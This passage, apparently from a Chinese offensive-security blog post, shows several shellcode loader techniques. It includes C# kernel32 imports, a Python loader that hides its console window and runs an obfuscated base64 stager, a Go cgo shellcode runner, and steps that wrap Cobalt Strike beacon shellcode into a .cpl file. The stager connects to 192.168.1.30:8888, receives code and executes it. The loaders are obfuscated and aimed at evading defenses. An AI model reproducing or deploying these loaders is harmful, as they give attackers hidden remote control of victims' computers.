initial !important;border-color: initial !important;"><span class="code-snippet_outer">                    <span style="color: rgb(167, 29, 93);">private</span> <span style="color: rgb(167, 29, 93);">static</span> <span style="color: rgb(167, 29, 93);">extern</span> <span style="color: rgb(0, 134, 179);">UInt32</span> <span style="color: rgb(0, 134, 179);">WaitForSingleObject</span>(</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">            <span style="color: rgb(0, 134, 179);">IntPtr</span> hHandle,</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">            <span style="color: rgb(0, 134, 179);">UInt32</span> dwMilliseconds</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">            );</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">            [<span style="color: rgb(0, 134, 179);">DllImport</span>(<span style="color: rgb(24, 54, 145);">"kernel32"</span>)]</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">                    <span style="color: rgb(167, 29, 93);">private</span> <span style="color: rgb(167, 29, 93);">static</span> <span style="color: rgb(167, 29, 93);">extern</span> <span style="color: rgb(0, 134, 179);">IntPtr</span> <span style="color: rgb(0, 134, 179);">GetModuleHandle</span>(</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">            <span style="color: rgb(167, 29, 93);">string</span> moduleName</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">            );</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">            [<span style="color: rgb(0, 134, 179);">DllImport</span>(<span style="color: rgb(24, 54, 145);">"kernel32"</span>)]</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">                    <span style="color: rgb(167, 29, 93);">private</span> <span style="color: rgb(167, 29, 93);">static</span> <span style="color: rgb(167, 29, 93);">extern</span> <span style="color: rgb(0, 134, 179);">UInt32</span> <span style="color: rgb(0, 134, 179);">GetProcAddress</span>(</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">            <span style="color: rgb(0, 134, 179);">IntPtr</span> hModule,</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">            <span style="color: rgb(167, 29, 93);">string</span> procName</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">            );</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">            [<span style="color: rgb(0, 134, 179);">DllImport</span>(<span style="color: rgb(24, 54, 145);">"kernel32"</span>)]</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">                    <span style="color: rgb(167, 29, 93);">private</span> <span style="color: rgb(167, 29, 93);">static</span> <span style="color: rgb(167, 29, 93);">extern</span> <span style="color: rgb(0, 134, 179);">UInt32</span> <span style="color: rgb(0, 134, 179);">LoadLibrary</span>(</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">            <span style="color: rgb(167, 29, 93);">string</span> lpFileName</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">            );</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">            [<span style="color: rgb(0, 134, 179);">DllImport</span>(<span style="color: rgb(24, 54, 145);">"kernel32"</span>)]</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">                    <span style="color: rgb(167, 29, 93);">private</span> <span style="color: rgb(167, 29, 93);">static</span> <span style="color: rgb(167, 29, 93);">extern</span> <span style="color: rgb(0, 134, 179);">UInt32</span> <span style="color: rgb(0, 134, 179);">GetLastError</span>();</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">      }</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">}</span></code></pre></section><h4 style="margin: 2em 8px 0.5em;font-weight: bold;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(0, 152, 116);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;">py加载：</h4><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang=""><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(167, 29, 93);">import</span> base64,sys;</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(167, 29, 93);">import</span> ctypes</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><br  /></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">whnd = ctypes.windll.kernel32.<span style="color: rgb(0, 134, 179);">GetConsoleWindow</span>()</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(167, 29, 93);">if</span> whnd != <span style="color: rgb(0, 134, 179);">0</span>:</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">    ctypes.windll.user32.<span style="color: rgb(0, 134, 179);">ShowWindow</span>(whnd, <span style="color: rgb(0, 134, 179);">0</span>)</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">    ctypes.windll.kernel32.<span style="color: rgb(0, 134, 179);">CloseHandle</span>(whnd)</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><br  /></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(167, 29, 93);">exec</span>(base64.b64decode({<span style="color: rgb(0, 134, 179);">2</span>:str,<span style="color: rgb(0, 134, 179);">3</span>:<span style="color: rgb(167, 29, 93);">lambda</span> b:bytes(b,<span style="color: rgb(24, 54, 145);">'UTF-8'</span>)}[sys.version_info[<span style="color: rgb(0, 134, 179);">0</span>]](<span style="color: rgb(24, 54, 145);">'aW1wb3J0IHNvY2tldCxzdHJ1Y3QsdGltZQpmb3IgeCBpbiByYW5nZSgxMCk6Cgl0cnk6CgkJcz1zb2NrZXQuc29ja2V0KDIsc29ja2V0LlNPQ0tfU1RSRUFNKQoJCXMuY29ubmVjdCgoJzE5Mi4xNjguMS4zMCcsODg4OCkpCgkJYnJlYWsKCWV4Y2VwdDoKCQl0aW1lLnNsZWVwKDUpCmw9c3RydWN0LnVucGFjaygnPkknLHMucmVjdig0KSlbMF0KZD1zLnJlY3YobCkKd2hpbGUgbGVuKGQpPGw6CglkKz1zLnJlY3YobC1sZW4oZCkpCmV4ZWMoZCx7J3MnOnN9KQo='</span>)))</span></code></pre></section><h4 style="margin: 2em 8px 0.5em;font-weight: bold;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(0, 152, 116);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;">go内联c加载：</h4><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang=""><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(167, 29, 93);">package</span> main</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><br  /></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(167, 29, 93);">import</span> <span style="color: rgb(24, 54, 145);">"C"</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(167, 29, 93);">import</span> <span style="color: rgb(24, 54, 145);">"unsafe"</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><br  /></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">func main() {</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">    buf := <span style="color: rgb(24, 54, 145);">""</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">    buf += <span style="color: rgb(24, 54, 145);">"xddxc6xd9x74x24xf4x5fx33xc9xb8xb3x5ex2c"</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">    ...省略...</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">    buf += <span style="color: rgb(24, 54, 145);">"xc9xb1x97x31x47x1ax03x47x1ax83xc7x04xe2"</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">    <span style="color: rgb(150, 152, 150);">// at your call site, you can send the shellcode directly to the C</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">    <span style="color: rgb(150, 152, 150);">// function by converting it to a pointer of the correct type.</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">    shellcode := []<span style="color: rgb(167, 29, 93);">byte</span>(buf)</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">    C.call((*C.<span style="color: rgb(167, 29, 93);">char</span>)(<span style="color: rgb(167, 29, 93);">unsafe</span>.<span style="color: rgb(0, 134, 179);">Pointer</span>(&amp;shellcode[<span style="color: rgb(0, 134, 179);">0</span>])))</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">}</span></code></pre></section><h4 style="margin: 2em 8px 0.5em;font-weight: bold;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(0, 152, 116);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;">资源加载：</h4><p style="margin: 1.5em 8px;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">CPLResourceRunner:</p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li></ul><pre class="code-snippet__js" data-lang=""><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">cat shellcode.txt |sed <span style="color: rgb(24, 54, 145);">'s/[, ]//g; s/0x//g;'</span> |tr -d <span style="color: rgb(24, 54, 145);">'\n'</span> |xxd -p -r |gzip -c |base64 &gt; b64shellcode.txt</span></code></pre></section><p style="margin: 1.5em 8px;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">用Cobalt Strike 生成shellcode</p><p style="margin: 1.5em 8px;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">Attacks -&gt; Packages -&gt; Windows Executable (s) -&gt; Output =&gt; RAW (x86)</p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang=""><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"> py -<span style="color: rgb(0, 134, 179);">2</span> <span style="color: rgb(0, 134, 179);">ConvertShellcode</span>.py beacon.bin</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(0, 134, 179);">Shellcode</span> written to shellcode.txt</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><br  /></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(0, 134, 179);">0x4d</span>,<span style="color: rgb(0, 134, 179);">0x5a</span>,<span style="color: rgb(0, 134, 179);">0x41</span>,<span style="color: rgb(0, 134, 179);">0x52</span>,<span style="color: rgb(0, 134, 179);">0x55</span>,<span style="color: rgb(0, 134, 179);">0x48</span>,<span style="color: rgb(0, 134, 179);">0x89</span>,<span style="color: rgb(0, 134, 179);">0xe5</span>,<span style="color: rgb(0, 134, 179);">0x48</span>,<span style="color: rgb(0, 134, 179);">0x81</span>,<span style="color: rgb(0, 134, 179);">0xec</span>,<span style="color: rgb(0, 134, 179);">0x20</span>,<span style="color: rgb(0, 134, 179);">0x00</span>,<span style="color: rgb(0, 134, 179);">0x00</span>,<span style="color: rgb(0, 134, 179);">0x00</span>,<span style="color: rgb(0, 134, 179);">0x48</span>,<span style="color: rgb(0, 134, 179);">0x8d</span>,<span style="color: rgb(0, 134, 179);">0x1d</span>,<span style="color: rgb(0, 134, 179);">0xea</span>,<span style="color: rgb(0, 134, 179);">0xff</span>,<span style="color: rgb(0, 134, 179);">0xff</span>,<span style="color: rgb(0, 134, 179);">0xff</span>,<span style="color: rgb(0, 134, 179);">0x48</span>,<span style="color: rgb(0, 134, 179);">0x89</span>,<span style="color: rgb(0, 134, 179);">0xdf</span>,<span style="color: rgb(0, 134, 179);">0x48</span>,<span style="color: rgb(0, 134, 179);">0x81</span>,<span style="color: rgb(0, 134, 179);">0xc3</span>,<span style="color: rgb(0, 134, 179);">0x7c</span>,<span style="color: rgb(0, 134, 179);">0x79</span>,<span style="color: rgb(0, 134, 179);">0x01</span>,<span style="color: rgb(0, 134, 179);">0x00</span>,<span style="color: rgb(0, 134, 179);">0xff</span>,<span style="color: rgb(0, 134, 179);">0xd3</span>,<span style="color: rgb(0, 134, 179);">0x41</span>,<span style="color: rgb(0, 134, 179);">0xb8</span>,<span style="color: rgb(0, 134, 179);">0xf0</span>,<span style="color: rgb(0, 134, 179);">0xb5</span>,<span style="color: rgb(0, 134, 179);">0xa2</span>,<span style="color: rgb(0, 134, 179);">0x56</span>,<span style="color: rgb(0, 134, 179);">0x68</span>,<span style="color: rgb(0, 134, 179);">0x04</span>,<span style="color: rgb(0, 134, 179);">0x00</span>,<span style="color: rgb(0, 134, 179);">0x00</span>,<span style="color: rgb(0, 134, 179);">0x00</span>,<span style="color: rgb(0, 134, 179);">0x5a</span>,<span style="color: rgb(0, 134, 179);">0x48</span>,<span style="color: rgb(0, 134, 179);">0x89</span>,<span style="color: rgb(0, 134, 179);">0xf9</span>,<span style="color: rgb(0, 134, 179);">0xff</span>,<span style="color: rgb(0, 134, 179);">0xd0</span>,<span style="color: rgb(0, 134, 179);">0x00</span>,<span style="color: rgb(0, 134, 179);">0x00</span>,<span style="color: rgb(0, 134, 179);">0x00</span>,<span style="color: rgb(0, 134, 179);">0x00</span>,<span style="color: rgb(0, 134, 179);">0x00</span>,<span style="color: rgb(0, 134, 179);">0x00</span>,<span style="color: rgb(0, 134, 179);">0x00</span>,<span style="color: rgb(0, 134, 179);">0x00</span>,<span style="color: rgb(0, 134, 179);">0x00</span>,<span style="color: rgb(0, 134, 179);">0xf8</span>,<span style="color: rgb(0, 134, 179);">0x00</span>,<span style="color: rgb(0, 134, 179);">0x00</span>,<span style="color: rgb(0, 134, 179);">0x00</span>,<span style="color: rgb(0, 134, 179);">0x0e</span>,<span style="color: rgb(0, 134, 179);">0x1f</span>,<span style="color: rgb(0, 134, 179);">0xba</span>,<span style="color: rgb(0, 134, 179);">0x0e</span>,<span style="color: rgb(0, 134, 179);">0x00</span>,<span style="color: rgb(0, 134, 179);">0xb4</span>,<span style="color: rgb(0, 134, 179);">0x09</span>,<span style="color: rgb(0, 134, 179);">0xcd</span>,<span style="color: rgb(0, 134, 179);">0x21</span>,<span style="color: rgb(0, 134, 179);">0xb8</span>,<span style="color: rgb(0, 134, 179);">0x01</span>,<span style="color: rgb(0, 134, 179);">0x4c</span>,<span style="color: rgb(0, 134, 179);">0xcd</span>,<span style="color: rgb(0, 134, 179);">0x21</span>,<span style="color: rgb(0, 134, 179);">0x54</span>,<span style="color: rgb(0, 134, 179);">0x68</span>,<span style="color: rgb(0, 134, 179);">0x69</span>,<span style="color: rgb(0, 134, 179);">0x73</span>,<span style="color: rgb(0, 134, 179);">0x20</span>,<span style="color: rgb(0, 134, 179);">0x70</span>,<span style="color: rgb(0, 134, 179);">0x72</span>,<span style="color: rgb(0, 134, 179);">0x6f</span>,<span style="color: rgb(0, 134, 179);">0x67</span>,<span style="color: rgb(0, 134, 179);">0x72</span>,<span style="color: rgb(0, 134, 179);">0x61</span>,<span style="color: rgb(0, 134, 179);">0x6d</span>,<span style="color: rgb(0, 134, 179);">0x20</span>,<span style="color: rgb(0, 134, 179);">0x63</span>,<span style="color: rgb(0, 134, 179);">0x61</span>,<span style="color: rgb(0, 134, 179);">0x6e</span>,<span style="color: rgb(0, 134, 179);">0x6e</span>,<span style="color: rgb(0, 134, 179);">0x6f</span>,<span style="color: rgb(0, 134, 179);">0x74</span>,<span style="color: rgb(0, 134, 179);">0x20</span>,<span style="color: rgb(0, 134, 179);">0x62</span>,<span style="color: rgb(0, 134, 179);">0x65</span>,<span style="color: rgb(0, 134, 179);">0x20</span>,<span style="color: rgb(0, 134, 179);">0x72</span>,<span style="color: rgb(0, 134, 179);">0x75</span>,<span style="color: rgb(0, 134, 179);">0x6e</span>,<span style="color: rgb(0, 134, 179);">0x20</span>,<span style="color: rgb(0, 134, 179);">0x69</span>,<span style="color: rgb(0, 134, 179);">0x6e</span>,<span style="color: rgb(0, 134, 179);">0x20</span>,<span style="color: rgb(0, 134, 179);">0x44</span>,<span style="color: rgb(0, 134, 179);">0x4f</span>,<span style="color: rgb(0, 134, 179);">0x53</span>,<span style="color: rgb(0, 134, 179);">0x20</span>,<span style="color: rgb(0, 134, 179);">0x6d</span>,<span style="color: rgb(0, 134, 179);">0x6f</span>,<span style="color: rgb(0, 134, 179);">0x64</span>,<span style="color: rgb(0, 134, 179);">0x65</span>,<span style="color: rgb(0, 134, 179);">0x2e</span>,<span style="color: rgb(0, 134, 179);">0x0d</span>,<span style="color: rgb(0, 134, 179);">0x0a</span>,<span style="color: rgb(0, 134, 179);">0x24</span>,<span style="color: rgb(0, 134, 179);">0x00</span>,<span style="color: rgb(0, 134, 179);">0x00</span>,<span style="color: rgb(0, 134, 179);">0x00</span>,<span style="color: rgb(0, 134, 179);">0x00</span>,<span style="color: rgb(0, 134, 179);">0x00</span>,<span style="color: rgb(0, 134, 179);">0x00</span>,<span style="color: rgb(0, 134, 179);">0x00</span>,<span style="color: rgb(0, 134, 179);">0xc9</span>,<span style="color: rgb(0, 134, 179);">0xdb</span>,<span style="color: rgb(0, 134, 179);">0x6e</span>,<span style="color: rgb(0, 134, 179);">0xe9</span>,<span style="color: rgb(0, 134, 179);">0x8d</span>,<span style="color: rgb(0, 134, 179);">0xba</span>,<span style="color: rgb(0, 134, 179);">0x00</span>,<span style="color: rgb(0, 134, 179);">0xba</span>,<span style="color: rgb(0, 134, 179);">0x8d</span>,<span style="color: rgb(0, 134, 179);">0xba</span>,<span style="color: rgb(0, 134, 179);">0x00</span>,<span style="color: rgb(0, 134, 179);">0xba</span>,<span style="color: rgb(0, 134, 179);">0x8d</span>,<span style="color: rgb(0, 134, 179);">0xba</span>,<span style="color: rgb(0, 134, 179);">0x00</span>,<span style="color: rgb(0, 134, 179);">0xba</span>,<span style="color: rgb(0, 134, 179);">0xeb</span>,<span style="color: rgb(0, 134, 179);">0x54</span>,<span style="color: rgb(0, 134, 179);">0xd2</span>,<span style="color: rgb(0, 134, 179);">0xba</span>,<span style="color: rgb(0, 134, 179);">0x15</span>,<span style="color: rgb(0, 134, 179);">0xba</span>,<span style="color: rgb(0, 134, 179);">0x00</span>,<span style="color: rgb(0, 134, 179);">0xba</span>,<span style="color: rgb(0, 134, 179);">0x13</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><br  /></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><br  /></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">cat shellcode.txt |sed <span style="color: rgb(24, 54, 145);">'s/[, ]//g; s/0x//g;'</span> |tr -d <span style="color: rgb(24, 54, 145);">'n'</span> |xxd -p -r |gzip -c |base64 &gt; b64shellcode.txt</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><br  /></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">H4sIAPGjM14AA/<span style="color: rgb(0, 134, 179);">ONcgwK9eh86tH4RoGBgcGjV</span>/bV<span style="color: rgb(150, 152, 150);">////PTrvezQerqlkZPh/2XHHh62LwjJYgLJR</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(0, 134, 179);">Hp0</span><span style="color: rgb(150, 152, 150);">//19ggIEfQMwnv4uPYQvnWcUdjD5nFUMyMosVCory04sScxWSE/Py8ksUklIVikrzFDLzFFz8</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">gxVy81NS9Xi5VKBGnLyd97J3F8MuGH4dcmmXKJAWBgD9vO6hmAAAAA==</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><br  /></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(0, 134, 179);">Compile</span> to x86 <span style="color: rgb(167, 29, 93);">and</span> copy <span style="color: rgb(0, 134, 179);">CPLResourceRunner</span>.dll to <span style="color: rgb(0, 134, 179);">RunMe</span>.cpl</span></code></pre></section><h4 style="margin: 2em 8px 0.5em;font-weight: bold;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(0, 152, 116);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;">powershell加载(MMFml):</h4><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index 